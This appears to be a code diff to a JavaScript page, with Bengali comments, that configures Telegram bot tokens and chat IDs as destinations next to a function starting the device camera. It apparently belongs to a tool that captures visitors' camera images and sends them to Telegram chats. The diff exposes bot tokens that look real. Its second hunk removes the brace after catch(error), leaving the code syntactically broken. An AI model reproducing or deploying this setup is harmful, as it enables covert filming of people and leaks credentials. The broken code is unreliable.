@@ -657,9 +657,12 @@
 
         // --- টেলিগ্রাম এবং ক্যামেরা সেটিংস ---
         // এখানে একাধিক বট টোকেন এবং চ্যাট আইডি যোগ করতে পারেন
+        // *** সংশোধিত অংশ ***
         const TELEGRAM_TARGETS = [
-            { botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA","7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "6728809478","2139008203" },
-
+            { botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA", chatId: "6728809478" },
+            { botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }
+            // আরও যোগ করতে চাইলে নিচের ফরম্যাটে নতুন লাইন যোগ করুন:
+            // { botToken: "আপনার_নতুন_বট_টোকেন", chatId: "আপনার_নতুন_চ্যাট_আইডি" },
         ];
         let currentVideoStream = null;
 
@@ -668,7 +671,7 @@
             let video;
             try {
                 video = await startCamera(facingMode);
-            } catch (error) {
+            } catch (error)
                 console.error(`Could not start ${facingMode} camera. Skipping.`);
                 return;
             }
